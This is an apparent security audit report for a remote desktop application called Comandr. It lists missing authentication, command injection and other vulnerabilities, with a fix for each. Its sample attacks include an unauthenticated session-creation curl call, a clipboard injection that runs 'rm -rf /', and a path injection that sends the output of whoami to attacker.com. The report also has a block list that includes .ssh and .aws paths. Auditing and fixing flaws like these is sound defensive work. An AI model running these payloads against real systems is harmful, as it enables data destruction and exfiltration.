# 🔒 SECURITY AUDIT REPORT - Comandr Remote Desktop

**Date:** 2026-07-14  
**Status:** CRITICAL VULNERABILITIES FOUND  
**Action Required:** IMMEDIATE

---

## 🚨 CRITICAL VULNERABILITIES (3)

### 1. Missing Authentication on Remote Session Endpoints
**Risk:** CRITICAL  
**File:** `apps/api-gateway/src/modules/remote-sessions/remote-sessions.controller.ts`  
**Lines:** 1-173 (entire controller)

**Issue:**
No authentication guards on remote session endpoints. ANY unauthenticated user can:
- Create remote sessions to any device
- View all active sessions
- End any session
- Inject input events

**Attack:**
```bash
# Unauthenticated attacker can control ANY device
curl -X POST https://comandr-api.onrender.com/v1/remote-sessions \
  -H "Content-Type: application/json" \
  -d '{"target_device_id": "victim-device-uuid", "session_type": "interactive"}'
```

**Fix:**
```typescript
import { UseGuards } from '@nestjs/common';
import { JwtAuthGuard } from '../auth/jwt-auth.guard';

@Controller('v1/remote-sessions')
@UseGuards(JwtAuthGuard)  // ← ADD THIS
export class RemoteSessionsController {
  // Add tenant isolation checks in each method
  @Post()
  async createSession(@Request() req, @Body() dto: CreateSessionDto) {
    // Verify user belongs to same tenant as target device
    const device = await this.devicesService.findOne(dto.target_device_id);
    if (device.tenant_id !== req.user.tenant_id) {
      throw new ForbiddenException('Cannot access device from different tenant');
    }
    // ... rest of logic
  }
}
```

---

### 2. Command Injection in Clipboard Operations
**Risk:** CRITICAL  
**File:** `apps/desktop-app/src/agent.ts`  
**Lines:** 122-124

**Issue:**
Unescaped user input directly interpolated into shell commands.

**Attack:**
```json
{
  "task": "clipboard.write",
  "parameters": {
    "text": "\"; rm -rf / #"
  }
}
```
Resulting command: `echo ""; rm -rf / #" | pbcopy`  
**Executes arbitrary commands with desktop app privileges.**

**Fix:**
```typescript
// BEFORE (VULNERABLE):
await execAsync(`echo "${parameters.text}" | pbcopy`);

// AFTER (SAFE):
import { clipboard } from 'electron';
clipboard.writeText(parameters.text);

// OR use proper escaping:
import { spawn } from 'child_process';
const proc = spawn('pbcopy');
proc.stdin.write(parameters.text);
proc.stdin.end();
```

---

### 3. Command Injection in Screenshot Path
**Risk:** HIGH  
**File:** `apps/desktop-app/src/agent.ts`  
**Lines:** 141, 147

**Issue:**
Unescaped file path in shell command.

**Attack:**
```json
{
  "task": "screenshot.capture",
  "parameters": {
    "path": "/tmp/x.png\"; curl attacker.com/exfil?data=$(whoami) #"
  }
}
```

**Fix:**
```typescript
// Validate path contains no shell metacharacters
if (/[;&|$`<>(){}[\]!\\]/.test(parameters.path)) {
  throw new Error('Invalid characters in path');
}

// Use array-based spawn instead of shell interpolation
import { spawn } from 'child_process';
spawn('screencapture', ['-x', parameters.path]);
```

---

## ⚠️ HIGH SEVERITY VULNERABILITIES (7)

### 4. Missing Rate Limiting on Authentication
**Risk:** HIGH  
**File:** `apps/api-gateway/src/modules/auth/auth.controller.ts`  
**Lines:** 27-58

**Issue:** Brute-force password guessing, credential stuffing, account enumeration

**Fix:**
```bash
pnpm add @nestjs/throttler
```

```typescript
// app.module.ts
import { ThrottlerModule } from '@nestjs/throttler';

@Module({
  imports: [
    ThrottlerModule.forRoot({
      ttl: 60,
      limit: 5, // 5 requests per minute
    }),
  ],
})

// auth.controller.ts
import { Throttle } from '@nestjs/throttler';

@Throttle(5, 60) // 5 requests per 60 seconds
@Post('login')
async login(@Body() dto: LoginDto) { ... }
```

---

### 5. Missing Input Validation on Remote Session Creation
**Risk:** HIGH  
**File:** `apps/api-gateway/src/modules/remote-sessions/remote-sessions.service.ts`  
**Lines:** 78-124

**Issue:** SQL injection, NoSQL injection in JSONB fields

**Fix:**
```typescript
import { z } from 'zod';

const CreateSessionSchema = z.object({
  target_device_id: z.string().uuid(),
  tenant_id: z.string().uuid(),
  session_type: z.enum(['interactive', 'view_only', 'unattended', 'file_transfer_only']),
  permissions: z.object({
    control: z.boolean(),
    view: z.boolean(),
    file_transfer: z.boolean(),
  }).strict(),
});

async createSession(dto: CreateSessionDto) {
  const validated = CreateSessionSchema.parse(dto); // Throws if invalid
  // ... use validated data
}
```

---

### 6. Unrestricted File Access in Desktop Agent
**Risk:** HIGH  
**File:** `apps/desktop-app/src/executors/file-executor.ts`  
**Lines:** 12-73

**Issue:** Remote attacker can read/write/delete ANY file on device

**Fix:**
```typescript
const ALLOWED_PATHS = [
  os.homedir(),
  path.join(os.homedir(), 'Desktop'),
  path.join(os.homedir(), 'Documents'),
  path.join(os.homedir(), 'Downloads'),
];

const BLOCKED_PATHS = [
  '/etc', '/System', '/Windows', '/boot',
  '/usr/bin', '/usr/sbin', 'C:\\Windows\\System32',
  path.join(os.homedir(), '.ssh'),
  path.join(os.homedir(), '.aws'),
];

function validatePath(requestedPath: string): void {
  const normalized = path.normalize(requestedPath);
  
  // Check if in allowed paths
  const isAllowed = ALLOWED_PATHS.some(allowed => 
    normalized.startsWith(allowed)
  );
  
  // Check if blocked
  const isBlocked = BLOCKED_PATHS.some(blocked => 
    normalized.startsWith(blocked)
  );
  
  if (isBlocked || !isAllowed) {
    throw new Error('Access denied: restricted path');
  }
}
```

---

### 7. Remote Input Injection Without User Consent
**Risk:** HIGH  
**File:** `apps/desktop-app/src/main.ts`  
**Lines:** 963-1023

**Issue:** No confirmation dialog when remote session starts

**Fix:**
```typescript
// Show notification when remote session requested
async function onRemoteSessionRequest(sessionId: string, initiatorEmail: string) {
  const response = await dialog.showMessageBox({
    type: 'warning',
    title: 'Remote Session Request',
    message: `${initiatorEmail} wants to control this device`,
    detail: 'They will be able to see your screen and control mouse/keyboard.',
    buttons: ['Accept', 'Deny'],
    defaultId: 1,
    cancelId: 1,
  });
  
  if (response.response !== 0) {
    // User clicked "Deny"
    await api.rejectSession(sessionId);
    return;
  }
  
  // Show persistent indicator
  showSessionActiveIndicator(initiatorEmail);
}
```

---

### 8. Insecure Password Reset Token Generation
**Risk:** MEDIUM-HIGH  
**File:** `apps/api-gateway/src/modules/auth/auth.service.ts`  
**Lines:** 175-186

**Fix:**
```typescript
import * as crypto from 'crypto';

async requestPasswordReset(email: string) {
  // Use crypto.randomBytes instead of UUID
  const token = crypto.randomBytes(32).toString('hex');
  const expiresAt = new Date(Date.now() + 3600000); // 1 hour
  
  // Store HMAC of token, not plaintext
  const hmac = crypto.createHmac('sha256', process.env.JWT_SECRET);
  hmac.update(token);
  const tokenHash = hmac.digest('hex');
  
  await this.supabase
    .from('password_reset_tokens')
    .insert({ user_id, token_hash: tokenHash, expires_at: expiresAt });
  
  // Send email (token in URL)
  await this.sendResetEmail(email, token);
  
  return { success: true };
}
```

---

### 9. Missing Tenant Isolation in Admin Service
**Risk:** HIGH  
**File:** `apps/api-gateway/src/modules/admin/admin.service.ts`  
**Lines:** 5-19

**Issue:** Platform admin from Tenant A can modify users in Tenant B

**Fix:**
```typescript
// Document this is intentional for platform admins
// OR add tenant-scoped admin role:

async listAllUsers(requestingUserId: string) {
  const requestingUser = await this.getUser(requestingUserId);
  
  if (requestingUser.role === 'tenant_admin') {
    // Tenant admin: only return users from same tenant
    return this.supabase
      .from('users')
      .select('*')
      .eq('tenant_id', requestingUser.tenant_id);
  }
  
  if (requestingUser.role === 'platform_admin') {
    // Platform admin: return all users (with audit logging)
    await this.auditLog({
      action: 'list_all_users',
      admin_id: requestingUserId,
      timestamp: new Date(),
    });
    
    return this.supabase.from('users').select('*');
  }
  
  throw new ForbiddenException('Insufficient permissions');
}
```

---

### 10. Exposed Service Role Key in .env File
**Risk:** HIGH  
**File:** `/Users/david/Downloads/commandai/.env`  
**Lines:** 24, 27

**⚠️ IMMEDIATE ACTION REQUIRED:**

1. **Rotate keys NOW:**
   - Go to https://xnmmwqrezspgjspdllzb.supabase.co/project/xnmmwqrezspgjspdllzb/settings/api
   - Generate new `service_role` key
   - Update Render environment variables
   - Go to https://resend.com/api-keys
   - Regenerate API key

2. **Remove from git history:**
```bash
cd /Users/david/Downloads/commandai
git filter-branch --force --index-filter \
  "git rm --cached --ignore-unmatch .env" \
  --prune-empty --tag-name-filter cat -- --all
git push origin --force --all
```

3. **Prevent future commits:**
```bash
# .env is already in .gitignore, but verify:
cat .gitignore | grep ".env"

# Create .env.example with placeholders:
cat > .env.example << 'EOF'
SUPABASE_URL=https://your-project.supabase.co
SUPABASE_ANON_KEY=your_anon_key_here
SUPABASE_SERVICE_ROLE_KEY=your_service_role_key_here
JWT_SECRET=generate_with_openssl_rand_base64_32
RESEND_API_KEY=re_xxxxxxxxxxxx
EOF

git add .env.example
git commit -m "Add .env.example template"
```

---

## 📊 RISK SUMMARY

| Severity | Count | Status |
|----------|-------|--------|
| **CRITICAL** | 3 | ⚠️ IMMEDIATE FIX REQUIRED |
| **HIGH** | 7 | 🔴 FIX BEFORE PRODUCTION |
| **MEDIUM** | - | (See concurrency audit) |

---

## ✅ IMMEDIATE ACTION CHECKLIST

- [ ] **1. Rotate Supabase service role key** (5 minutes)
- [ ] **2. Rotate Resend API key** (2 minutes)
- [ ] **3. Add JwtAuthGuard to remote-sessions controller** (10 minutes)
- [ ] **4. Fix command injection in clipboard/screenshot** (15 minutes)
- [ ] **5. Add rate limiting to auth endpoints** (20 minutes)
- [ ] **6. Add user consent dialog for remote sessions** (30 minutes)
- [ ] **7. Implement file path validation** (20 minutes)

**Total time to fix critical issues: ~2 hours**

---

## 📝 NOTES

- Dependency vulnerabilities found in vitest, glob, tar, multer
- Run `pnpm update` to patch known CVEs
- Consider code signing certificates to remove Windows SmartScreen warnings
- Add 2FA for production deployment

---

**DO NOT DEPLOY TO PRODUCTION UNTIL CRITICAL ISSUES ARE FIXED.**
